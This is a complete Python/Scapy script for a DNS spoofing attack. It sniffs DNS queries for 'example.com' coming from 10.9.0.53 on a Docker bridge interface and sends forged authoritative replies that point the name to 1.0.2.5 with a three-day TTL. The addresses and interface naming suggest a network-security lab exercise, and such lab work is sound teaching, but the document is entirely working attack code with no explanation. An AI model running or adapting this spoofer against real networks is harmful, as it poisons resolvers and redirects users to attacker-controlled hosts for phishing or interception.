#!/usr/bin/env python3
from scapy.all import *
import sys
NS_NAME = "example.com"
def spoof_dns(pkt):
    if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))

        # Swap the source and destination IP address
        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        # Swap the source and destination port number
        udp = UDP(dport=pkt[UDP].sport, sport=53)
        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='1.0.2.5')
        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=0, arcount=0,
                 an=Anssec)

        spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
        send(spoofpkt)

myFilter = "udp and src host 10.9.0.53 and dst port 53" # Set the filter
pkt=sniff(iface='br-fd88467e4c1d', filter=myFilter, prn=spoof_dns)